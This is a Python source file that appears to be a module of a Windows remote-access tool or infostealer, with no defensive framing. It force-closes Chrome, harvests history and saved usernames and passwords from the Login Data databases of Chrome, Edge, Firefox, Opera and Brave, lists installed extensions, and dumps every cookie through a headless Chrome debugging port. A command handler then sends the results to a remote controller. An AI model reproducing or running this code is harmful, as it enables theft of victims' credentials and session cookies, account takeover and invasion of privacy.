import winreg
import os
import sqlite3
import json
import subprocess
import signal
import time
import requests
import websocket
import getpass
from typing import Tuple, Dict, Any

def kill_chrome_process():
    try:
        subprocess.run("taskkill /F /IM chrome.exe", shell=True)
        time.sleep(2)
    except:
        pass

def get_browser_data():

    kill_chrome_process()

    browser_data = {}
    local_app_data = os.getenv("LOCALAPPDATA")
    app_data = os.getenv("APPDATA")

    paths = {
        "Chrome": os.path.join(local_app_data, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(local_app_data, "Microsoft", "Edge", "User Data"),
        "Firefox": os.path.join(app_data, "Mozilla", "Firefox", "Profiles"),
        "Opera": os.path.join(local_app_data, "Opera Software", "Opera Stable"),
        "Brave": os.path.join(local_app_data, "BraveSoftware", "Brave-Browser", "User Data"),
    }

    for browser, base_path in paths.items():
        if os.path.exists(base_path):
            browser_data[browser] = {}

            for profile in os.listdir(base_path):
                profile_path = os.path.join(base_path, profile)
                if os.path.isdir(profile_path) and (profile.lower().startswith("profile") or profile.lower() == "default"):
                    data = {"history": [], "autosaved": [], "cookies": [], "extensions": []}

                    history_db = os.path.join(profile_path, "History")
                    if os.path.exists(history_db):
                        try:
                            conn = sqlite3.connect(history_db)
                            cursor = conn.cursor()
                            cursor.execute("SELECT url, title, last_visit_time FROM urls")
                            data["history"] = cursor.fetchall()
                            conn.close()
                        except Exception as e:
                            data["history"] = f"Error reading history: {e}"

                    try:
                        cookies = extract_cookies()
                        data["cookies"] = cookies
                    except Exception as e:
                        data["cookies"] = f"Error reading cookies: {e}"

                    login_db = os.path.join(profile_path, "Login Data")
                    if os.path.exists(login_db):
                        try:
                            conn = sqlite3.connect(login_db)
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            data["autosaved"] = cursor.fetchall()
                            conn.close()
                        except Exception as e:
                            data["autosaved"] = f"Error reading passwords: {e}"

                    extensions_path = os.path.join(profile_path, "Extensions")
                    if os.path.exists(extensions_path):
                        try:
                            for ext in os.listdir(extensions_path):
                                ext_path = os.path.join(extensions_path, ext)
                                if os.path.isdir(ext_path):
                                    for version in os.listdir(ext_path):
                                        version_path = os.path.join(ext_path, version)
                                        manifest_path = os.path.join(version_path, "manifest.json")
                                        if os.path.exists(manifest_path):
                                            with open(manifest_path, "r", encoding="utf-8") as f:
                                                manifest_data = json.load(f)
                                                ext_name = manifest_data.get("name", "Unknown")
                                                ext_version = manifest_data.get("version", "Unknown")
                                                data["extensions"].append({"name": ext_name, "version": ext_version})
                        except Exception as e:
                            data["extensions"] = f"Error reading extensions: {e}"

                    browser_data[browser][profile] = data

    return browser_data


def extract_cookies() -> Dict[str, Any]:
    def get_paths() -> Tuple[str, str]:
        chrome_dir = None
        locations = (
                r'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe',
                r'C:\Program Files\Google\Chrome\Application\chrome.exe',
                rf'C:\Users\{getpass.getuser()}\AppData\Local\Google\Chrome\Application\chrome.exe',
            )
        for location in locations:
            if os.path.isfile(location):
                chrome_dir = f'"{location}"'
                break
        user_data_dir = r'%LOCALAPPDATA%\Google\Chrome\User Data'
        if chrome_dir is None:
            raise RuntimeError('No installation of Chrome detected.')
        return chrome_dir, user_data_dir

    def run_chrome_cmd(chrome_dir: str, user_data_dir: str) -> subprocess.Popen:
        chrome_cmd = (
            f'{chrome_dir} --user-data-dir="{user_data_dir}" https://www.google.com --headless --remote-debugging-port=9222 --remote-allow-origins=*'
        )
        process = subprocess.Popen(chrome_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(6)
        return process

    def get_cookies() -> Dict[str, Any]:
        websocket_url = requests.get('http://localhost:9222/json').json()[0].get('webSocketDebuggerUrl')
        ws = websocket.create_connection(websocket_url)
        ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
        result = ws.recv()
        ws.close()
        return json.loads(result)['result']['cookies']

    def kill_chrome_process_by_pid(chrome_proc: subprocess.Popen):
        try:
            os.kill(chrome_proc.pid, signal.SIGTERM)
        except:
            pass

    chrome_dir, user_data_dir = get_paths()
    chrome_process = run_chrome_cmd(chrome_dir, user_data_dir)

    try:
        cookies = get_cookies()
    finally:
        kill_chrome_process_by_pid(chrome_process)
    return cookies


browsers_registry = {
    "Chrome": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe",
    "Edge": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe",
    "Firefox": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\firefox.exe",
    "Opera": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\opera.exe",
    "Brave": r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\brave.exe"
}

def detect_installed_browsers():
    installed_browsers = []
    not_found_browsers = []

    for browser, reg_key in browsers_registry.items():
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_key):
                installed_browsers.append(browser)
        except FileNotFoundError:
            not_found_browsers.append(browser)

    return installed_browsers, not_found_browsers

def browsers(data, client, converter):
    command = data["browsers"]

    try:        
        if command == "installed_browsers":
            installed_browsers, not_found_browsers = detect_installed_browsers()

            if installed_browsers:
                data = "Installed on the remote: " + ", ".join(installed_browsers)
                client.send_message(converter.encode({"browsers": data}))
            elif not_found_browsers:
                data = "Not installed on the remote: " + ", ".join(not_found_browsers)
                client.send_message(converter.encode({"browsers": data}))

        elif command == "browsers_data":
            data = get_browser_data()
            client.send_message(converter.encode({"browsers": data}))

    except Exception as e:
        client.send_message(converter.encode({"browsers_logger": str(e)}))